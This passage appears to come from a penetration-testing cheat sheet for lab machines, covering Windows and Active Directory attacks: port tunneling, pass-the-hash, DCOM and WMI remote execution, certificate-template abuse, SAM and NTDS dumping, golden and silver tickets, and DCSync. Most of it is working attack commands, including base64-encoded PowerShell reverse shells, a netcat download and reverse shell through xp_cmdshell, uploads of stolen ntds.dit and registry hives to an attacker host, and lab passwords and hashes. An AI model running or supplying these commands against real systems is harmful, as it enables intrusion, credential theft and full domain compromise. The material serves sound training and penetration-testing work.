token = "123" # Token that is used to authenticate the client for the service. Change to a arbitrary v&gt;
bind_addr = "0.0.0.0:5000" # `5202` specifies the port that exposes `my_nas_ssh` to the Internet

######################
then run client on kali:

######################
./rathole client.toml

######################
# client.toml
[client]
remote_addr = "192.168.216.246:2333" # The address of the server. The port must be the same with the po&gt;

[client.services.my_nas_ssh]
token = "123" # Must be the same with the server to pass the validation
local_addr = "127.0.0.1:4444" # The address of the service that needs to be forwarded

######################

Then, for example if you need to forward a port 8000 from victim to get to internal port, flip it.

######################

So, run server on kali:

######################

./rathole server.toml


bind_addr = "0.0.0.0:2334" # `2333` specifies the port that rathole listens for cl&gt;

[server.services.my_nas_ssh]
token = "123" # Token that is used to authenticate the client for the service. Cha&gt;
bind_addr = "0.0.0.0:8000" # `5202` specifies the port that exposes `my_nas_ssh`

######################
Then run client on victim:

./rathole client.toml

# client.toml
[client]
remote_addr = "192.168.45.219:2334" # The address of the server. The port must be the same with the port in `server.bind_a&gt;

[client.services.my_nas_ssh]
token = "123" # Must be the same with the server to pass the validation
local_addr = "127.0.0.1:8000" # The address of the service that needs to be forwarded




</code></pre>
<h3 id="dns"><a class="header" href="#dns">DNS</a></h3>
<pre><code>
cd dns_tunneling
cat dnsmasq.conf
sudo dnsmasq -C dnsmasq.conf -d
sudo tcpdump -i ens192 udp port 53


resolvectl status
nslookup exfiltrated-data.feline.corp

cat dnsmasq_txt.conf
sudo dnsmasq -C dnsmasq_txt.conf -d
nslookup -type=txt www.feline.corp

nslookup -type=txt give-me.cat-facts.internal


dnscat2
---
sudo tcpdump -i ens192 udp port 53
dnscat2-server feline.corp
cd dnscat/
./dnscat feline.corp
dnscat2-server feline.corp
windows
window -i 1
?
listen --help


listen 127.0.0.1:4455 172.16.2.11:445
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234

listen 0.0.0.0:4646 172.16.229.217:4646
./dnscat_exercise_client -i 192.168.229.7 -p 4646



</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="lateral-movement"><a class="header" href="#lateral-movement">Lateral Movement</a></h2>
<h3 id="links-18"><a class="header" href="#links-18">Links</a></h3>
<ul>
<li><a href="https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/">Pass the Hash</a></li>
<li><a href="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#lateral-movement">AD Cheat Sheet</a></li>
</ul>
<p>Hey, Why are you here? Do you have HASH or PASSWORD? Users Hash and Kerberos Ticket. Why crack Hashes and Passwords when you can pass them?</p>
<h3 id="psexec"><a class="header" href="#psexec">PsExec</a></h3>
<pre><code>
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
hostname
whoami



</code></pre>
<h3 id="pass-the-hash"><a class="header" href="#pass-the-hash">Pass the Hash</a></h3>
<pre><code>Pass The Hash -&gt; NTLM Hash Only
# Requires local admin privs

# Hashes
1) impacket-psexec -hashes ":d098fa8675acd7d26ab86eb2581233e5" &lt;user&gt;@&lt;DC IP&gt;
1) impacket-psexec -hashes ":d098fa8675acd7d26ab86eb2581233e5" &lt;domain&gt;/&lt;user&gt;@&lt;DC IP&gt;
3) impacket-wmiexec -hashes ":32196B56FFE6F45E294117B91A83BF38" Administrator@&lt;IP&gt;

# Password
1) impacket-psexec &lt;user&gt;:&lt;password&gt;@&lt;ip&gt; # Try impacket-psexec
1) impacket-psexec &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; # Try impacket-psexec

3) pth-winexe -U Administrator%&lt;NTLM Hash&gt;:&lt;NTLM Hash&gt; //&lt;IP&gt; cmd
3) pth-winexe -U Administrator%&lt;NTLM Hash&gt;:&lt;SHA1 Hash&gt; //&lt;IP&gt; cmd                                            

3) evil-winrm -i &lt;IP&gt; -u &lt;User&gt; -H &lt;HASH&gt;

4) python smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@&lt;IP&gt;
5) pth-smbclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //&lt;IP&gt;/c$
6) crackmapexec smb &lt;IP&gt; -u Administrator -H &lt;hash&gt; -x ipconfig
</code></pre>
<h3 id="overpass-the-hash"><a class="header" href="#overpass-the-hash">Overpass the Hash</a></h3>
<pre><code>Turn NTLM hash to Kerberos ticket and Avoid NTLM Auth.
# Requires local admin privs

mimikatz
sekurlsa::pth /user:&lt;username&gt; /domain:&lt;domain_name&gt; /ntlm:&lt;ntlm_hash&gt; /run:PowerShell.exe
# New PowerShell prompt.
net use \\dc01 # To authenticate to a DC and generate a TGT and TGS.

.\PsExec.exe \\dc01 cmd.exe # With the Help of TGT we log in to the account.
</code></pre>
<h3 id="pass-the-ticket"><a class="header" href="#pass-the-ticket">Pass the Ticket</a></h3>
<pre><code>
whoami
ls \\web04\backup
privilege::debug
sekurlsa::tickets /export
dir *.kirbi
kerberos::ptt [0;130c8d]-0-0-40810000-dave@cifs-web04.kirbi
klist
ls \\web04\backup


</code></pre>
<h3 id="dcom"><a class="header" href="#dcom">DCOM</a></h3>
<pre><code>
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.189.72"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
tasklist | findstr "calc"

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=","7")


nc -lnvp 443
whoami
hostname

</code></pre>
<h3 id="wmi-and-winrm"><a class="header" href="#wmi-and-winrm">WMI and WinRM</a></h3>
<pre><code>

wmic /node:192.168.189.73 /user:jen /password:Nexus123! process call create "calc"

$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName 192.168.189.73 -Credential $credential -SessionOption $Options 
$command = 'calc';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};


$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.189.72 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};




winrs -r:legacy -u:adrian -p:i6yuT6tym@  "cmd /c hostname &amp; whoami"

winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANgA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="


$username = 'dave2';
$password = 'password123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName CLIENT02 -Credential $credential
Enter-PSSession 1
whoami
hostname


</code></pre>
<h3 id="active-directory-certificate-services-adcs-example"><a class="header" href="#active-directory-certificate-services-adcs-example">Active Directory Certificate Services (ADCS) <a href="https://0xdf.gitlab.io/2023/06/17/htb-escape.html">Example</a></a></h3>
<pre><code>#### Identify ADCS

crackmapexec ldap 10.10.11.202 -u ryan.cooper -p NuclearMosquito3 -M adcs

#### Identify Vulnerable Template

upload Certify.exe

.\Certify.exe find /vulnerable /currentuser


### Abuse Template

.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator

Both the README and the end of that output show the next step. I’ll copy everything from `-----BEGIN RSA PRIVATE KEY-----` to `-----END CERTIFICATE-----` into a file on my host and convert it to a `.pfx` using the command given, entering no password when prompted:


openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx

.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap

The last line is the NTLM hash for the administrator account.

or #### With Certipy

certipy-ad find -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -text -stdout -vulnerable

certipy-ad req -u ryan.cooper -p NuclearMosquito3 -target sequel.htb -upn administrator@sequel.htb -ca sequel-dc-ca -template UserAuthentication

certipy-ad auth -pfx administrator.pfx

ntpdate -u sequel.htb

certipy-ad auth -pfx administrator.pfx

### Hybrid Box on Vulnlab
### Similiar attack, but keep it mind isn't perfect, had issues where this just wasn't working, had to revert box before it went through
###  https://procoder.in/2023/08/17/hybrid-vulnlab/

certipy-ad find -u peter.turner@hybrid.vl -p 'b0cwR+G4Dzl_rw' -dc-ip 10.10.186.213

python3 keytabextract.py krb5.keytab


certipy-ad req -u 'MAIL01$'@hybrid.vl -hashes 0f916c5246fdbc7ba95dcef4126d57bd -c 'hybrid-DC01-CA' -target 'hybrid.vl' -template 'HybridComputers' -upn 'administrator@hybrid.vl' -dns 'dc01.hybrid.vl' -key-size 4096 -debug

certipy-ad auth -pfx administrator_dc01.pfx -dc-ip 10.10.186.213


evil-winrm -u administrator -H 60701e8543c9f6db1a2af3217386d3dc -i 10.10.186.213

</code></pre>
<h3 id="from-htb-streamio-for-readlapspassword-writeowner-owns-privilege-attack"><a class="header" href="#from-htb-streamio-for-readlapspassword-writeowner-owns-privilege-attack">From HTB StreamIO for "<strong>ReadLAPSPassword</strong>" "WriteOwner /Owns" privilege attack</a></h3>
<pre><code>
While logged in as a user, but got creds for a user who can read LAPS Password:

upload /usr/share/windows-binaries/PowerView.ps1

Import-Module .\PowerView.ps1
$pass = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "Core Staff" -PrincipalIdentity "streamio\JDgodd"
Add-DomainGroupMember -Credential $cred -Identity "Core Staff" -Members "StreamIO\JDgodd"
net user jdgodd /domain
Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
Get-DomainObject DC -Credential $cred -Properties "ms-Mcs-AdmPwd",name

or just do this from kali:

ldapsearch -x -b 'DC=streamIO,DC=htb' -H ldap://streamio.htb -D JDgodd@streamio.htb -W "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="hash-dumping"><a class="header" href="#hash-dumping">Hash Dumping</a></h2>
<h3 id="sam-dumping"><a class="header" href="#sam-dumping">SAM Dumping</a></h3>
<pre><code>Dumping the SAM hashes on Victim

reg save hklm\system system
reg save hklm\sam sam

-&gt; Exfiltrate to our Kali machine and use a tool called samdump2 or powershell or mimikatz.

# Methods, not everytime hashes are crackable.
1) impacket-secretsdump -sam sam -system system -security security local # BEST
2) cp /usr/bin/samdump2 .
samdump2 system sam # Less Reliable
3) crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -p &lt;pass&gt; --sam
</code></pre>
<h3 id="sam-hash-cracking"><a class="header" href="#sam-hash-cracking">SAM Hash Cracking</a></h3>
<pre><code># Put DC IP or IP where you want to Pivot, the user is from SAM hash, Modify the hash and remove dots and name.

crackmapexec smb &lt;IP&gt; -u &lt;user&gt; -H aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 -x ipconfig
</code></pre>
<h3 id="gmsa-password"><a class="header" href="#gmsa-password">GMSA PAssword</a></h3>
<pre><code>https://github.com/rvazarkar/GMSAPasswordReader

GMSAPasswordReader.exe


iwr -uri http://192.168.45.152:9090/GMSAPasswordReader.exe -Outfile GMSAPasswordReader.exe

.\GMSAPasswordReader.exe --accountName 'svc_apache'


Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 4B3F0BF258E6C099A7B800EC37B2D456
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="persistence"><a class="header" href="#persistence">Persistence</a></h2>
<p>With krbtgt, We can create a Golden ticket.</p>
<h3 id="links-19"><a class="header" href="#links-19">Links</a></h3>
<ul>
<li><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">LSA Dump</a></li>
</ul>
<pre><code># Initial location of the NTDS database on the domain controller
C:\Windows\NTDS\NTDS.dit

# Step 1 → Finding a way to get the NDTS.dis and SYSTEM file
# Step 2 → Crack/Analyze offline
</code></pre>
<h3 id="golden-ticket-attack"><a class="header" href="#golden-ticket-attack">Golden Ticket Attack</a></h3>
<pre><code># Assuming that Victim account is member of Domain Admin or we have compromised the DC.
# Let's extract pass hash of krbtgt account with mimikatz.

mimikatz
privilege::debug
lsadump::lsa /patch # Look for User:krbtgt and it's NTLM Hash.

kerberos::purge
kerberos::golden /user:&lt;TOPI&gt; /domain:&lt;domain_name&gt; /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:&lt;NTLM hash&gt; /ptt
# This is allowed because DC trusts anything which is encrytped by krbtgt pass hash.

misc::cmd
psexec.exe \\dc01 cmd.exe # Lateral movement to DC.
whoami
whoami /groups
</code></pre>
<h3 id="dcsync-attack"><a class="header" href="#dcsync-attack">DCSync Attack</a></h3>
<pre><code>DSync (Domain Controller Synchronization) -&gt; Steal Pass hashes of all Admin Users in Domain.

Methods:
1) Laterally move to DC and run mimikatz to dump pass hash of every user.
2) Steal ntdis.dit from DC.
3) Above 2 requires tool upload and can get caught so we use 3rd method to abuse DC's functionality.
# Login with a Local admin priv account and run mimikatz.

mimikatz
lsadump::dcsync /user:Administrator # Administrator is target account.


impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.205.70

</code></pre>
<p>We can request a replication update with a DC and obtain the pass hashes of every account in Active Directory without ever logging in to the domain controller.</p>
<p>Another DCSync Attack involves creating a ticket with Rubeus, like here:
<a href="https://0xdf.gitlab.io/2023/05/06/htb-flight.html#auth-as-svc_apache">HTB Flight</a></p>
<pre><code>#### Generate Ticket
.\rubeus.exe tgtdeleg /nowrap

#### Configure Kerberos Ticket
#### https://github.com/skelsec/minikerberos/tree/main

minikerberos-kirbi2ccache ticket.kirbi ticket.ccache

#### Now I’ll export the environment variable to hold that ticket:

export KRB5CCNAME=ticket.ccache

#### Time Issues
ntpdate -s flight.htb

#### Get the Hash:

secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
or
impacket-secretsdump -k -no-pass g0.flight.htb 


### Shell
#### Those hashes work for a pass the hash attack:


crackmapexec smb flight.htb -u administrator -H aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c

rlwrap -cAr psexec.py administrator@flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c

</code></pre>
<h3 id="other-notes-1"><a class="header" href="#other-notes-1">Other Notes</a></h3>
<h3 id="silver-tickets"><a class="header" href="#silver-tickets">Silver Tickets</a></h3>
<pre><code>iwr -UseDefaultCredentials http://web04
privilege::debug
sekurlsa::logonpasswords

whoami /user

kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
exit


klist
iwr -UseDefaultCredentials http://web04 | findstr /i OS{
(iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"



</code></pre>
<h3 id="another-silver-ticket-attack"><a class="header" href="#another-silver-ticket-attack">Another Silver Ticket Attack</a></h3>
<h4 id="from-vulnlab-breach"><a class="header" href="#from-vulnlab-breach">From VulnLab Breach</a></h4>
<p>https://medium.com/@persecure/breach-vulnlab-f30761f08be6</p>
<pre><code>## We can get the Domain SID from impacket’s lookupsid:

impacket-lookupsid breach.vl/svc_mssql:'Trustno1'@10.10.78.61

## We can just convert the plaintext password to NTLM on any browser-based tool.
https://codebeautify.org/ntlm-hash-generator

## And lastly, for the SPN we can retrieve it from the kerberoast attack.
GetUserSPNs.py breach.vl/Julia.Wong:Computer1

## To create the silver ticket we need to use impacket-ticketer. Remember to choose Administrator as the user.

impacket-ticketer -nthash '69596C7AA1E8DAEE17F8E78870E25A5C' -domain-sid 'S-1-5-21-2330692793-3312915120-706255856' -domain breach.vl -spn 'MSSQLSvc/breach.vl:1433' -user-id 500 Administrator


## Export the ticket.

export KRB5CCNAME=Administrator.ccache

## We can use the ticket to gain access to the mssql server..

mssqlclient.py breach.vl -k -no-pass -windows-auth

### This machine goes on to do this:

xp_cmdshell powershell -c "wget -usebasicparsing http://10.8.1.176:8888/nc64.exe -o C:\Temp\nc64.exe"

xp_cmdshell powershell -c "C:\Temp\nc64.exe -e cmd 10.8.1.176 443"

## Privesc
JuicyPotatoNG.exe -t * -p "nc64.exe" -a "-e cmd.exe 10.8.1.213 80"


</code></pre>
<h3 id="shadow-copies"><a class="header" href="#shadow-copies">Shadow Copies</a></h3>
<pre><code>*Shadow Copies*

vshadow.exe -nw -p  C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL



powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\ntds.dit.bak')"


powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\system.bak')"
</code></pre>
<h3 id="copy-filesebackupprivilege"><a class="header" href="#copy-filesebackupprivilege">### Copy-FileSeBackupPrivilege</a></h3>
<p>https://github.com/giuliano108/SeBackupPrivilege</p>
<pre><code>One way to read and copy files:

upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
import-module .\SeBackupPrivilegeCmdLets.dll
import-module .\SeBackupPrivilegeUtils.dll
Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns
type \programdata\netlogon.dns

</code></pre>
<h3 id="diskshadow"><a class="header" href="#diskshadow">### DiskShadow</a></h3>
<pre><code>put this into a file called vss.dsh:

set context persistent nowriters 
set metadata c:\programdata\df.cab 
set verbose on 
add volume c: alias df 
create expose %df% z:


---
unix2dos vss.dsh
upload vss.dsh c:\programdata\vss.dsh
diskshadow /s c:\programdata\vss.dsh

smbserver.py s . -smb2support -username df -password df
net use \\10.10.14.14\s /u:df df
Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.14\s\ntds.dit
reg.exe save hklm\system \\10.10.14.14\system
secretsdump.py -system system -ntds ntds.dit LOCAL

</code></pre>
<h3 id="ticket-generation-from-linux"><a class="header" href="#ticket-generation-from-linux">Ticket generation from Linux</a></h3>
<pre><code># Generate a ticket or convert it (kekeo) to ccache format
ticketer.py -nthash &lt;hash&gt; -domain-sid &lt;sid&gt; -domain &lt;domain&gt; &lt;user&gt;

# Export the path in the right variable
export KRB5CCNAME=/tmp/ticket.ccache
klist

# Exec and use the ticket
/impacket/examples/psexec.py -k -n -debug DOMAIN/user@host

# Dump NTDS
proxychains secretsdump.py -k -no-pass qsec@DCFIL.PRAMAFIL.CORP -use-vss

</code></pre>
<h3 id="golden-ticket-1"><a class="header" href="#golden-ticket-1">Golden Ticket</a></h3>
<pre><code># Golden Ticket
&gt; Nom du compte administrateur (Administrateur)
&gt; Nom complet du domaine (domain.local)
&gt; SID du domaine (S-1-5-21-1723555596-1415287819-2705645101) [whoami /user]
&gt; Hash NTLM du compte krbtgt (6194bd1a5bf3ecd542e8aac9860bddf0)

mimikatz # privilege:debug
mimikatz # lsadump::lsa /inject /name:krbtgt

mimikatz # kerberos::golden /admin:Administrateur /domain:domain.local /sid:S-1-5-21-1723555596-1415287819-2705645101 /krbtgt:6194bd1a5bf3ecd542e8aac9860bddf0 /ticket:domain.local.kirbi /id:500 /ptt

Use :
mimikatz # kerberos::ptt domain.local.kirbi
mimikatz # kerberos::list



# Resource
https://twitter.com/mpgn_x64/status/1241688547037532161

# Golden ticket and access denied ?
# from cmd (elevated)
&gt; mimikatz kerberos::golden
&gt; klist add_bind &lt;DOMAIN&gt; &lt;DC&gt;
&gt; psexec \\dc\ cmd


</code></pre>
<h3 id="playing-with-tickets-on-windows"><a class="header" href="#playing-with-tickets-on-windows">Playing with tickets on Windows</a></h3>
<pre><code># Sessions en cours
mimikatz # sekurlsa::logonpasswords

# Ticket TGT
# Dump SPN
PS C:\&gt; Find-PSServiceAccounts -DumpSPN
Discovering service account SPNs in the AD Domain foo.local
svcSQLServ/pc1.foo.local:1433

# Download Mimikatz
PS C:\&gt; Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
PS C:\&gt; Invoke-Mimikatz
mimikatz(powershell) # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

# Lister les tickets actifs ou les purger
PS C:\&gt; Invoke-Mimikatz -Command '"kerberos::purge"'
PS C:\&gt; Invoke-Mimikatz -Command '"kerberos::list"'
PS C:\&gt; klist

# Demander un ticket
PS C:\&gt; Add-Type -AssemblyName System.IdentityModel
PS C:\&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "svcSQLServ/pc1.foo.local:1433"

# Exporter un ticket
mimikatz # kerberos::list /export

# Crack Ticket
python tgsrepcrack.py wordlist.txt ticket.kirbi

</code></pre>
<h3 id="local-extraction"><a class="header" href="#local-extraction">Local Extraction</a></h3>
<h5 id="vssadmin"><a class="header" href="#vssadmin">VSSadmin</a></h5>
<pre><code># Récupération via VSSadmin
# Create a Volume Shadow Copy
C:\Windows\system32&gt; vssadmin create shadow /for=C:

# Retrieve NTDS from the copy
C:\Windows\system32&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit c:\Extract\ntds.dit

# Copy SYSTEM file
C:\Windows\system32&gt; reg SAVE HKLM\SYSTEM c:\Extract\SYS
